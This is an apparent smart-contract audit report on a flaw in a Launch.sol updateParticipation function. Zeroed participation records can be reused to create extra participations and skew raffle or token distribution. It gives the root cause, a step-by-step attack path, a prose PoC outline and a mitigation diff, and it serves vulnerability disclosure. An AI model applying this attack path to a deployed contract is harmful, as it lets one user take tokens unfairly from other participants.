# Users Can Bypass Participation Restrictions to Get More Token Distribution in a Launch Group

### Summary

In the `Launch.sol` contract, the `updateParticipation` function allows for the update of participation records but fails to fully invalidate previous participation records `if prevInfo.currencyAmount == 0 || prevInfo.tokenAmount = 0`, leading to the risk of record reuse. This flaw may allow users to bypass participation restrictions for launch group of `non-finalizesAtParticipation`, leading to manipulation of participation-based logic, such as token distribution, especially in cases where random distribution or Raffle mechanisms depend on participation counts.

### Root Cause

The `updateParticipation` function allows users to create new participations by repeatedly modifying an old participation. This is because the function only sets the `prevInfo.currencyAmount = 0; prevInfo.tokenAmount = 0;` of the old participation when updating it, and it does not check whether the previous `prevInfo.currencyAmount = 0; prevInfo.tokenAmount = 0` are already zero during the **next update**.

Therefore, users can exploit this behavior to create numerous participations, thereby increasing their chances of winning the Raffle and gaining more token shares due to:

1. Lack of historical record validation  
2. Using zeroing instead of proper status marking

```solidity
    function updateParticipation(UpdateParticipationRequest calldata request, bytes calldata signature)
        external
        nonReentrant
        whenNotPaused
        onlyLaunchGroupStatus(request.launchGroupId, LaunchGroupStatus.ACTIVE)
{
...
        ParticipationInfo storage prevInfo = launchGroupParticipations[request.prevLaunchParticipationId];
    
         // ... Validation logic ...

         // Handling transfer 
    
        // @audit Error: Only zeroing out the amounts, allowing this participation to be reused and essentially creating more new participation for Raffle
        prevInfo.currencyAmount = 0;
        prevInfo.tokenAmount = 0;
```

### Internal Pre-conditions

A previously used participation ID can be reused many times to create new participation.

### External Pre-conditions

The contract must checks for whether a participation ID has already been used or updated.

### Attack Path

Attackers or Common Users can exploit this vulnerability by following these steps:
1. The user obtains a valid `participationId_1`  
   - `tokenAmount = 100`  
   - `currencyAmount = 1000`  

2. The user calls `updateParticipation`  
   - `prevId = participationId_1`  
   - `newId = participationId_2`  
   - `participationId_1` is zeroed out  
   - `participationId_2` has new allocations  

3. The user reuses `participationId_1`  
   - `prevId = participationId_1`  
   - `newId = participationId_3`  
   - `participationId_1` is zeroed out  
   - `participationId_3` has new allocations 
   
Results: Since it is only zeroed out and not marked as invalid, It can be used again for new participation. This bypasses the participation limit

### Impact

1.**Bypassing Participation Limits**: Attackers can bypass token or participation limits, allowing them to unfairly increase their chances of winning or gaining additional tokens.
2.**Undermines the rights of other participants**: resulting in an unfair distribution of tokens or rewards.

### PoC

Here’s an outline of the POC:

1. **Step 1: Obtain Participation ID**:
   - Attacker participates in the event, receiving a valid `participationId_1`.

2. **Step 2: Use `updateParticipation`**:
   - The attacker invokes `updateParticipation` with the `prevLaunchParticipationId = participationId_1`, which sets the token and currency amounts to zero, but does not invalidate or mark the participation ID as used.

3. **Step 3: Reuse Participation ID**:
   - The attacker reuses the same `participationId_1` in subsequent participation events, bypassing the system’s intended restrictions.

}

### Mitigation

It is recommended to track Participation Status to check whether the participation has been updated, cancelled, or is active. This will ensure that the participation record cannot be reused or altered without proper validation. Alternatively, a simpler solution is to validate participation amounts before updating. Ensure that the previous participation is still valid before performing any updates. If the currencyAmount or tokenAmount is zero, the participation should be considered invalid and rejected in the updating action. 

```solidity
function updateParticipation(
    UpdateParticipationRequest calldata request,
    bytes calldata signature
) external nonReentrant whenNotPaused {
...
    ParticipationInfo storage prevInfo = launchGroupParticipations[request.prevLaunchParticipationId];
    
    // 1. Validate that the amounts are not zero (i.e., the participation has not been updated yet)
+   if (prevInfo.currencyAmount == 0 || prevInfo.tokenAmount == 0) {
+       revert InvalidPreviousParticipation();
+   }
    
    // 2. Additional validation...
    
    // 3. Zero out the old record
    prevInfo.currencyAmount = 0;
    prevInfo.tokenAmount = 0;
    
...
}

```
